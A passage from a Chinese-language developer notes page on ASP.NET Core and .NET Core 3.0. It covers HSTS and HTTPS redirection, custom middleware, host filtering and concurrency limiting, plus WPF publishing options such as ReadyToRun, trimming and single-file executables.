<p>HTTPS: <a href="https://www.cnblogs.com/JulianHuang/p/11858800.html" target="_blank" rel="noopener">https://www.cnblogs.com/JulianHuang/p/11858800.html</a><br>HSTS: <a href="https://www.cnblogs.com/JulianHuang/p/12156997.html" target="_blank" rel="noopener">https://www.cnblogs.com/JulianHuang/p/12156997.html</a></p>
</blockquote>
<p>&emsp;&emsp;我们利用 Visual Studio 2019 项目模板构建 ASP.Net Core 项目，勾选 HTTPS 支持，会默认添加 HTTPS 支持：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app.UseHttpsRedirection()  <span class="comment">// 强制 Http 请求跳转到 Https</span></span><br><span class="line">app.UseHsts()</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;HSTS（HTTP Strict Transport Protocol）的作用是强制浏览器使用 HTTPS 与服务器创建连接，避免原有的 301 重定向 Https 时可能发生中间人劫持。<br>&emsp;&emsp;服务器开启 HSTS 的方法是，当客户端通过HTTPS发出请求时，在服务器返回的超文本传输协议响应头中包含 Strict-Transport-Security 字段。非加密传输时设置的 HSTS 字段无效。它告诉浏览器为特定的主机头和特定的时间范围缓存证书。  </p>
<p>&emsp;&emsp;若使用 Kestrel 作为边缘（face-to-internet）Web 服务器， 参见下面的服务配置：</p>
<ul>
<li>为 STS header 设置了 preload 参数，Preload 不是 RFC HSTS 规范的一部分，但是浏览器支持在全新安装时预加载 HSTS 网站</li>
<li>指定子域或排除的子域 使用 HSTS 协议</li>
<li>设置浏览器缓存 [访问站点的请求均使用 HTTPS 协议] 这一约定的时间，默认是 30 天。</li>
</ul>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ConfigureServices</span>(<span class="params">IServiceCollection services</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    services.AddMvc();</span><br><span class="line"></span><br><span class="line">    services.AddHsts(options =&gt;</span><br><span class="line">    &#123;</span><br><span class="line">        options.Preload = <span class="literal">true</span>;</span><br><span class="line">        options.IncludeSubDomains = <span class="literal">true</span>;</span><br><span class="line">        options.MaxAge = TimeSpan.FromDays(<span class="number">60</span>);</span><br><span class="line">        options.ExcludedHosts.Add(<span class="string">"example.com"</span>);</span><br><span class="line">        options.ExcludedHosts.Add(<span class="string">"www.example.com"</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    services.AddHttpsRedirection(options =&gt;</span><br><span class="line">    &#123;</span><br><span class="line">        options.RedirectStatusCode = StatusCodes.Status307TemporaryRedirect;</span><br><span class="line">        options.HttpsPort = <span class="number">5001</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>请注意： UseHsts 对于本地回送 hosts 并不生效。</p>
<ul>
<li><code>localhost</code>：IPv4 回送地址</li>
<li><code>127.0.0.1</code>：IPv4 回送地址</li>
<li><code>[::1]</code>：IPv6 回送地址</li>
</ul>
<p>这也是开发者在本地启动时 抓不到<code>Strict-Transport-Security</code>响应头的原因。</p>
</blockquote>
<hr>
<h4 id="自定义中间件"><a href="#自定义中间件" class="headerlink" title="自定义中间件"></a>自定义中间件</h4><blockquote>
<p><a href="https://mp.weixin.qq.com/s/PUdolCF8I9GCXlt1DI_BMw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/PUdolCF8I9GCXlt1DI_BMw</a></p>
</blockquote>
<p>中间件是一种装配到应用程序管道以处理请求和响应的软件，每个组件可以：</p>
<ol>
<li>选择是否将请求传递到管道中的下一个组件。</li>
<li>可在调用管道中的下一个组件前后执行工作。即中间件的事前逻辑和事后逻辑。</li>
</ol>
<p>如果出现错误，它不会再进行下一个组件，而是原路返回。  </p>
<p>中间件的写法：</p>
<ol>
<li>命名：类名后缀 Middleware</li>
<li>构造函数：注入 RequestDelegate next</li>
<li>异步方法命名：async Task Invoke(HttpContext context)</li>
</ol>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">CustomMiddleware</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> RequestDelegate _next;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CustomMiddleware</span>(<span class="params">RequestDelegate next</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _next = next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">async</span> Task <span class="title">Invoke</span>(<span class="params">HttpContext context</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="comment">// Do Something</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> _next(context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">CustomExtension</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IApplicationBuilder <span class="title">UseCustom</span>(<span class="params"><span class="keyword">this</span> IApplicationBuilder app</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">return</span> app.UseMiddleware&lt;CustomMiddleware&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Configure</span>(<span class="params">IApplicationBuilder app, IWebHostEnvironment env</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// app.UseMiddleware&lt;CustomMiddleware&gt;();</span></span><br><span class="line">    app.UseCustom();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// app.UseXXX</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="ASP-NET-Core-主机地址过滤-HostFiltering"><a href="#ASP-NET-Core-主机地址过滤-HostFiltering" class="headerlink" title="ASP.NET Core 主机地址过滤 HostFiltering"></a>ASP.NET Core 主机地址过滤 HostFiltering</h4><blockquote>
<p><a href="https://www.cnblogs.com/yyfh/p/11855862.html" target="_blank" rel="noopener">https://www.cnblogs.com/yyfh/p/11855862.html</a></p>
</blockquote>
<p>&emsp;&emsp;<code>HostFilteringMiddleware</code>做的是对请求主机头的限制，也相当于一个请求主机头白名单，标识着某些主机头你可以访问，其余的你别访问了我这边未允许。  </p>
<h5 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h5><ol>
<li>配置<code>HostFilteringOptions</code><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">services.PostConfigure&lt;HostFilteringOptions&gt;(options =&gt;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (options.AllowedHosts == <span class="literal">null</span> || options.AllowedHosts.Count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// "AllowedHosts": "localhost;127.0.0.1;[::1]"</span></span><br><span class="line">        <span class="keyword">var</span> hosts = Configuration[<span class="string">"AllowedHosts"</span>]?.Split(<span class="keyword">new</span>[] &#123; <span class="string">';'</span> &#125;, StringSplitOptions.RemoveEmptyEntries);</span><br><span class="line">        <span class="comment">// Fall back to "*" to disable.</span></span><br><span class="line">        options.AllowedHosts = (hosts?.Length &gt; <span class="number">0</span> ? hosts : <span class="keyword">new</span>[] &#123; <span class="string">"*"</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

</li>
</ol>
<blockquote>
<p><code>HostFilteringOptions</code>：</p>
<ul>
<li><code>AllowedHosts</code>：允许访问的 Host 主机</li>
<li><code>AllowEmptyHosts</code>：是否允许请求头 Host 的值为空访问，默认为 true</li>
<li><code>IncludeFailureMessage</code>：返回错误信息，默认为 true</li>
</ul>
</blockquote>
<ol start="2">
<li><p>在 <code>Configure</code> 方法中添加 HostFiltering 中间件</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Configure</span>(<span class="params">Microsoft.AspNetCore.Builder.IApplicationBuilder app, IWebHostEnvironment env</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    app.UseHostFiltering();</span><br><span class="line">    app.Run(context =&gt;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> context.Response.WriteAsync(<span class="string">"Hello World! "</span> + context.Request.Host);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>appsettings.json</code></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"AllowedHosts"</span>: <span class="string">"127.0.0.1"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ol>
<figure class="image-box">
                <img src="1098068-20191114112620796-67212582.gif" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;当我们请求带着 Host 头去访问的时候，通过该中间件判断该 Host 头是否在我们预先配置好的里面，如果在里面那么就继续请求下一个中间件，如果说不在则返回 400。</p>
<hr>
<h4 id="ASP-NET-Core-3-x-并发限制"><a href="#ASP-NET-Core-3-x-并发限制" class="headerlink" title="ASP.NET Core 3.x 并发限制"></a>ASP.NET Core 3.x 并发限制</h4><blockquote>
<p><a href="https://www.cnblogs.com/yyfh/p/11843358.html" target="_blank" rel="noopener">https://www.cnblogs.com/yyfh/p/11843358.html</a></p>
</blockquote>
<p>&emsp;&emsp;<code>Microsoft.AspNetCore.ConcurrencyLimiter</code> ASP.NET Core 3.0 后增加的，用于传入的请求进行排队处理，避免线程池的不足。<br>&emsp;&emsp;我们日常开发中可能常做的给某 Web 服务器配置连接数以及，请求队列大小，那么今天我们看看如何在通过中间件形式实现一个并发量以及队列长度限制。</p>
<h5 id="添加-Nuget"><a href="#添加-Nuget" class="headerlink" title="添加 Nuget"></a>添加 Nuget</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Install-Package Microsoft.AspNetCore.ConcurrencyLimiter</span><br></pre></td></tr></table></figure>

<h5 id="Queue-策略"><a href="#Queue-策略" class="headerlink" title="Queue 策略"></a>Queue 策略</h5><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ConfigureServices</span>(<span class="params">IServiceCollection services</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    services.AddQueuePolicy(options =&gt;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//最大并发请求数</span></span><br><span class="line">        options.MaxConcurrentRequests = <span class="number">2</span>;</span><br><span class="line">        <span class="comment">//请求队列长度限制</span></span><br><span class="line">        options.RequestQueueLimit = <span class="number">1</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">    services.AddControllers();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Configure</span>(<span class="params">IApplicationBuilder app, IWebHostEnvironment env</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//添加并发限制中间件</span></span><br><span class="line">    app.UseConcurrencyLimiter();</span><br><span class="line">    app.Run(<span class="keyword">async</span> context =&gt;</span><br><span class="line">    &#123;</span><br><span class="line">        Task.Delay(<span class="number">100</span>).Wait(); <span class="comment">// 100ms sync-over-async</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> context.Response.WriteAsync(<span class="string">"Hello World!"</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">if</span> (env.IsDevelopment())</span><br><span class="line">    &#123;</span><br><span class="line">        app.UseDeveloperExceptionPage();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    app.UseHttpsRedirection();</span><br><span class="line"></span><br><span class="line">    app.UseRouting();</span><br><span class="line"></span><br><span class="line">    app.UseAuthorization();</span><br><span class="line"></span><br><span class="line">    app.UseEndpoints(endpoints =&gt;</span><br><span class="line">    &#123;</span><br><span class="line">        endpoints.MapControllers();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Stack-策略"><a href="#Stack-策略" class="headerlink" title="Stack 策略"></a>Stack 策略</h5><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ConfigureServices</span>(<span class="params">IServiceCollection services</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    services.AddStackPolicy(options =&gt;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//最大并发请求数</span></span><br><span class="line">        options.MaxConcurrentRequests = <span class="number">2</span>;</span><br><span class="line">        <span class="comment">//请求队列长度限制</span></span><br><span class="line">        options.RequestQueueLimit = <span class="number">1</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">    services.AddControllers();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>基于栈结构的特点，在实际应用中，通常只会对栈执行以下两种操作：</p>
<ul>
<li>向栈中添加元素，此过程被称为”进栈”（入栈或压栈）；</li>
<li>从栈中提取出指定元素，此过程被称为”出栈”（或弹栈）。</li>
</ul>
<p>队列存储结构的实现有以下两种方式：</p>
<ul>
<li>顺序队列：在顺序表的基础上实现的队列结构；</li>
<li>链队列：在链表的基础上实现的队列结构。</li>
</ul>
<hr>
<h3 id="Web-API"><a href="#Web-API" class="headerlink" title="Web API"></a>Web API</h3><figure class="image-box">
                <img src="restfulapi.png" alt="https://www.cnblogs.com/cgzl/p/11924700.html" title class>
                <p>https://www.cnblogs.com/cgzl/p/11924700.html</p>
            </figure>

<hr>
<h3 id="gRPC"><a href="#gRPC" class="headerlink" title="gRPC"></a>gRPC</h3><hr>
<h3 id="SignalR"><a href="#SignalR" class="headerlink" title="SignalR"></a>SignalR</h3><hr>
<h3 id="MVC"><a href="#MVC" class="headerlink" title="MVC"></a>MVC</h3><hr>
<h3 id="Razor-Pages"><a href="#Razor-Pages" class="headerlink" title="Razor Pages"></a>Razor Pages</h3><hr>
<h3 id="Blazor"><a href="#Blazor" class="headerlink" title="Blazor"></a>Blazor</h3><hr>
<h3 id="Identity"><a href="#Identity" class="headerlink" title="Identity"></a>Identity</h3><hr>
<h2 id="WPF"><a href="#WPF" class="headerlink" title="WPF"></a>WPF</h2><h3 id="为什么在-NET-Core-上使用-Windows-desktop"><a href="#为什么在-NET-Core-上使用-Windows-desktop" class="headerlink" title="为什么在 .NET Core 上使用 Windows desktop"></a>为什么在 .NET Core 上使用 Windows desktop</h3><blockquote>
<p><a href="https://www.cnblogs.com/muran/p/11808508.html" target="_blank" rel="noopener">https://www.cnblogs.com/muran/p/11808508.html</a></p>
</blockquote>
<h4 id="使用-ReadyToRun-优化-NET-Core-应用"><a href="#使用-ReadyToRun-优化-NET-Core-应用" class="headerlink" title="使用 ReadyToRun 优化 .NET Core 应用"></a>使用 ReadyToRun 优化 .NET Core 应用</h4><p>&emsp;&emsp;通过将应用程序程序集编译为 ReadyToRun（R2R）格式，可以缩短 .NET Core 应用程序的启动时间。R2R 是一种提前（AOT）编译的形式。它是 .NET Core 3.0 中的发布时选择功能。<br>&emsp;&emsp;R2R 二进制文件通过减少应用程序加载时 JIT 需要完成的工作量来提高启动性能。R2R 二进制文件较大，因为它们既包含中间语言（IL）代码（某些情况下仍然需要此代码），也包含相同代码的本机版本，以改善启动。  </p>
<p>要启用 ReadyToRun 编译：</p>
<ul>
<li>将 <code>PublishReadyToRun</code> 属性设置为 <code>true</code>。</li>
<li>使用显式发布 <code>RuntimeIdentifier</code>。</li>
</ul>
<p>&emsp;&emsp;注意：编译应用程序程序集时，生成的本机代码特定于平台和体系结构（这就是发布时必须指定有效的 RuntimeIdentifier 的原因）。  </p>
<p>下面是一个例子：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Project</span> <span class="attr">Sdk</span>=<span class="string">"Microsoft.NET.Sdk"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">PropertyGroup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">OutputType</span>&gt;</span>Exe<span class="tag">&lt;/<span class="name">OutputType</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TargetFramework</span>&gt;</span>netcoreapp3.0<span class="tag">&lt;/<span class="name">TargetFramework</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">PublishReadyToRun</span>&gt;</span>true<span class="tag">&lt;/<span class="name">PublishReadyToRun</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">PropertyGroup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>并使用以下命令发布：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dotnet publish -r win-x64 -c Release</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ul>
<li><code>RuntimeIdentifier</code> 可以将其设置为其他操作系统或芯片。也可以在项目文件中设置。</li>
<li>如果在发布过程中遇到错误，请添加 <code>&lt;PublishReadyToRunShowWarnings&gt;true&lt;/PublishReadyToRunShowWarnings&gt;</code> 查看详情日志。</li>
</ul>
<h4 id="Assembly-linking"><a href="#Assembly-linking" class="headerlink" title="Assembly linking"></a>Assembly linking</h4><p>&emsp;&emsp;.NET core 3.0 SDK 附带了一个工具，该工具可以通过分析 IL 和修剪未使用的程序集来减小应用程序的大小。这是 .NET Core 3.0 中的另一个发布时选择加入功能。<br>&emsp;&emsp;借助 .NET Core，始终可以发布包含运行代码所需的一切的自包含应用程序，而无需在部署目标上安装 .NET。在某些情况下，该应用仅需要框架的一小部分即可运行，并且可能仅包含所使用的库就可以变得更小。<br>&emsp;&emsp;使用 <a href="https://github.com/mono/linker" target="_blank" rel="noopener">IL 链接器</a>扫描应用程序的 IL，以检测实际需要哪些代码，然后修剪未使用的框架库。这可以大大减小某些应用程序的大小。通常，类似小型工具的控制台应用程序受益最大，因为它们倾向于使用框架的较小子集，并且通常更易于调整。  </p>
<p>要使用链接器：</p>
<ul>
<li>将 <code>PublishTrimmed</code> 属性设置为 <code>true</code>。</li>
<li>使用显式发布 <code>RuntimeIdentifier</code>。</li>
</ul>
<p>下面是一个例子：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Project</span> <span class="attr">Sdk</span>=<span class="string">"Microsoft.NET.Sdk"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">PropertyGroup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">OutputType</span>&gt;</span>Exe<span class="tag">&lt;/<span class="name">OutputType</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TargetFramework</span>&gt;</span>netcoreapp3.0<span class="tag">&lt;/<span class="name">TargetFramework</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">PublishTrimmed</span>&gt;</span>true<span class="tag">&lt;/<span class="name">PublishTrimmed</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">PropertyGroup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>并使用以下命令发布：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dotnet publish -r win-x64 -c Release</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;注意：<code>RuntimeIdentifier</code> 可以将其设置为其他操作系统或芯片。也可以在项目文件中设置。<br>&emsp;&emsp;经测试对于 helloworld 应用程序，大小从 〜 68 MB 减小到 〜 28 MB。<br>&emsp;&emsp;修剪后使用反射或相关动态功能的应用程序或框架（包括 ASP.NET Core 和 WPF）通常会中断，因为链接器不了解这种动态行为，并且通常无法确定反射所需的框架类型在运行时。要修剪此类应用程序，您需要告知链接器有关代码中以及依赖的任何包或框架中反射所需要的任何类型。修剪后一定要测试应用程序。针对这个问题微软在 .NET 5 上正在努力改善。<br>&emsp;&emsp;有关 IL Linker 的更多信息，请参阅<a href="https://aka.ms/dotnet-illink" target="_blank" rel="noopener">文档</a>，或访问 <a href="https://github.com/mono/linker" target="_blank" rel="noopener">mono / linker 存储库</a>。<br>&emsp;&emsp;Assembly linking 和 ReadyToRun compiler 可用于同一应用程序。通常，Assembly linking 使应用程序更小，ready-to-run compiler 使应用程序更大一些，但在性能上有明显优势。可以在各种配置中进行测试以了解每个选项的影响。</p>
<h4 id="发布单文件可执行文件"><a href="#发布单文件可执行文件" class="headerlink" title="发布单文件可执行文件"></a>发布单文件可执行文件</h4><p>&emsp;&emsp;可以使用发布单个文件的可执行文件 <code>dotnet publish</code>。这种形式的单个 <code>EXE</code> 实际上是一个自解压缩的可执行文件。它包含所有依赖项（包括本地依赖项）作为资源。在第一次启动时，它将所有依赖项复制到一个临时目录，并在该目录中加载它们。它只需要解压缩依赖项一次。当再次启动时将会很快启动，并且没有任何损失。<br>&emsp;&emsp;可以通过将 <code>PublishSingleFile</code> 属性添加到项目文件或在命令行上添加新的参数来启用此发布选项。  </p>
<p>要生成一个独立的单个 EXE 应用程序，在这种情况下，对于 64 位 Windows：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dotnet publish -r win10-x64 /p:PublishSingleFile=true</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ul>
<li><code>RuntimeIdentifier</code> 可以将其设置为其他操作系统或芯片。也可以在项目文件中设置。</li>
<li>关于临时目录，请参考 <a href="https://github.com/dotnet/designs/blob/master/accepted/single-file/extract.md#extraction-location" target="_blank" rel="noopener">Extracting Bundled Files to Disk</a></li>
</ul>
<p>&emsp;&emsp;有关更多信息，请参见<a href="https://github.com/dotnet/core-setup/pull/5286" target="_blank" rel="noopener">单文件捆绑器</a>。<br>&emsp;&emsp;Assembly trimmer, ahead-of-time compilation（通过 crossgen）和单个文件捆绑都是 .NET Core 3.0 中的所有新功能，可以一起使用，也可以单独使用。</p>
<h4 id="综合使用"><a href="#综合使用" class="headerlink" title="综合使用"></a>综合使用</h4><p>&emsp;&emsp;通过设置属性 <code>&lt;PublishSingleFile&gt;</code>，<code>&lt;RuntimeIdentifier&gt;</code>、<code>&lt;PublishTrimmed&gt;</code>、<code>&lt;PublishReadyToRun&gt;</code>、<code>&lt;PublishReadyToRunShowWarnings&gt;</code> 在发布配置文件中，能够将修剪、ahead-of-time compilation 后的自包含应用程序部署为单个 .exe 文件，如下面的示例所示。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">PropertyGroup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">OutputType</span>&gt;</span>Exe<span class="tag">&lt;/<span class="name">OutputType</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TargetFramework</span>&gt;</span>netcoreapp3.0<span class="tag">&lt;/<span class="name">TargetFramework</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">PublishSingleFile</span>&gt;</span>true<span class="tag">&lt;/<span class="name">PublishSingleFile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">RuntimeIdentifier</span>&gt;</span>win-x64<span class="tag">&lt;/<span class="name">RuntimeIdentifier</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">PublishReadyToRun</span>&gt;</span>true<span class="tag">&lt;/<span class="name">PublishReadyToRun</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">PublishReadyToRunShowWarnings</span>&gt;</span>true<span class="tag">&lt;/<span class="name">PublishReadyToRunShowWarnings</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">PublishTrimmed</span>&gt;</span>true<span class="tag">&lt;/<span class="name">PublishTrimmed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">PropertyGroup</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;然后使用 Visual Studio 发布工具或者命令 <code>dotnet publish -c release</code> 发布。</p>
<h4 id="MSIX"><a href="#MSIX" class="headerlink" title="MSIX"></a>MSIX</h4><p>&emsp;&emsp;如果你正在寻找一种将应用程序分发给最终用户的方法，那么将其打包为 <a href="https://docs.microsoft.com/en-us/windows/msix/" target="_blank" rel="noopener">MSIX</a> 可能比创建单个 <code>.exe</code> 文件更好。<code>PublishSingleFile</code> 提供了一个包含所有应用程序依赖项的自解压 ZIP 文件，而 MSIX 提供了干净可靠的 Windows 集成应用程序安装和卸载。《MSDN 杂志》上写了<a href="https://msdn.microsoft.com/en-us/magazine/mt833462" target="_blank" rel="noopener">一篇文章</a>，不仅展示了如何打包应用程序，而且还展示了如何为 MSIX 包设置持续集成（CI），持续部署（CD）和自动更新。</p>
<hr>
<h3 id="ViewModel-实现-INotifyPropertyChanged-接口"><a href="#ViewModel-实现-INotifyPropertyChanged-接口" class="headerlink" title="ViewModel 实现 INotifyPropertyChanged 接口"></a>ViewModel 实现 INotifyPropertyChanged 接口</h3><blockquote>
<p><a href="https://mp.weixin.qq.com/s/QfuOWvqaSK6NcwsE7N-ojQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/QfuOWvqaSK6NcwsE7N-ojQ</a></p>
</blockquote>
